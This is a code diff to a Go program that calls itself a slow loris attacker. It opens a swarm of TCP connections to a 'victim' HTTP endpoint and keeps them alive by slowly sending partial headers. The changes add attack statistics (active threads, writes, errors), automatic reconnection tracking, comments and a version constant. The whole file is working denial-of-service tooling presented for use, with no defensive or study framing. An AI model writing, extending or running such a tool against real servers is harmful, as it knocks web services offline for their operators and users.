@@ -24,10 +24,13 @@ type state struct {
 // struct representing a slow loris attacker
 type attacker struct {
       id            int
-      conn          net.Conn
-      errors        int
-      writeCount    int
+      conn          net.Conn // network connection
+      active        int // 0 if connection is lost, 1 o.w.
+      errors        int // # of times connection has been lost
+      writes    int // # of writes to endpoint
 }
+
+const version = 0.1
 
 func main() {
   endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
@@ -79,7 +82,7 @@ func main() {
       if err := writeEndpoint(atk_i.conn, baseReq); err != nil {
         fmt.Println("attacker", atk_i.id, "failed to write to server")
       } else {
-        fmt.Println("base header sent by attacker", atk_i.id)
+        //fmt.Println("base header sent by attacker", atk_i.id)
       }
       doneChan<- 1
     }(atk_i)
@@ -90,17 +93,14 @@ func main() {
     <-doneChan
   }
 
-  closeChan := make(chan *attacker)
-
   // dispatch goroutines to initiate attack
   for _, attacker := range swarm {
     go loris(attacker, doneChan, attackState.delay, reqHeaders.loris, attackState.endpoint)
   }
 
   for {
-    select {
-    case <-closeChan:
-    }
+    time.Sleep(time.Duration(attackState.delay) * time.Second)
+    displayStats(swarm)
   }
 
   // wait on all attacks to complete (only when timeout specified)
@@ -109,11 +109,28 @@ func main() {
   }
 }
 
+// displays stats about the slow loris
+func displayStats(swarm []*attacker) {
+  var numActive, numErrors, numWrites int
+  for i := 0; i < len(swarm); i++ {
+    numActive += swarm[i].active
+    numErrors += swarm[i].errors
+    numWrites += swarm[i].writes
+  }
+  fmt.Println("=====================")
+  fmt.Println("total writes:", numWrites)
+  fmt.Println("total errors:", numErrors)
+  fmt.Println("total active threads:", numActive)
+}
+
+// writes some data to a specified connection object
 func writeEndpoint(conn net.Conn, message []byte) error {
   _, err := conn.Write(message)
   return err
 }
 
+// creates a slice of attacker structures of the specified size, and for the
+// specified endpoint
 func createSwarm(numAttackers int, endpoint string) []*attacker {
   swarm := make([]*attacker, 0)
   // use doneChan to wait on goroutines that create attackers
@@ -124,7 +141,7 @@ func createSwarm(numAttackers int, endpoint string) []*attacker {
     go func(i int) {
       conn := createAttacker(endpoint)
       fmt.Println("attacker #", i, "created")
-      swarm = append(swarm, &attacker{id: i, conn: conn, errors: 0, writeCount: 0})
+      swarm = append(swarm, &attacker{id: i, conn: conn, active: 1, errors: 0, writes: 0})
       doneChan<- 1
     }(i)
   }
@@ -132,10 +149,12 @@ func createSwarm(numAttackers int, endpoint string) []*attacker {
   for i := 0; i < numAttackers; i++ {
     <-doneChan
   }
-  fmt.Println("exiting createSwarm")
+  fmt.Println("Swarm of,", numAttackers, "threads created.")
   return swarm
 }
 
+// repeatadly attempts to create a connection object for a given endpoint
+// until connection initiation is successful, returns resulting connection
 func createAttacker(endpoint string) net.Conn {
   conn, err := net.Dial("tcp", endpoint+":http")
   // attempt to establish connection until successful
@@ -154,11 +173,13 @@ func loris(worker *attacker, doneChan chan int, delay int, header string, endpoi
     repeatHeader := []byte(header)
     if err := writeEndpoint(worker.conn, repeatHeader); err != nil {
       worker.errors += 1
+      worker.active = 0
       fmt.Println("error with repeat header, establishing connection #",worker.errors)
       worker.conn = createAttacker(endpoint)
+      worker.active = 1
     } else {
-      worker.writeCount += 1
-      fmt.Println("loris sent by attacker", worker.id)//, worker.attacks, "for this worker", total, "total"  )
+      worker.writes += 1
+      //fmt.Println("loris sent by attacker", worker.id)//, worker.attacks, "for this worker", total, "total"  )
     }
   }
   doneChan <- 1
@@ -167,7 +188,7 @@ func loris(worker *attacker, doneChan chan int, delay int, header string, endpoi
 // utility function, prints details about attack
 func announceAttack(attackState *state) {
   fmt.Println("==========================================")
-  fmt.Println("AASHRAY'S SLOW LORIS ATTACKER Version 0.1")
+  fmt.Println("AASHRAY'S SLOW LORIS ATTACKER Version", version)
   fmt.Println("        VICTIM OF ATTACK:", attackState.endpoint)
   fmt.Println("        NUMBER OF ATTACKERS:", attackState.numAttackers)
   fmt.Println("        DELAY BETWEEN EACH WRITE:", attackState.delay)
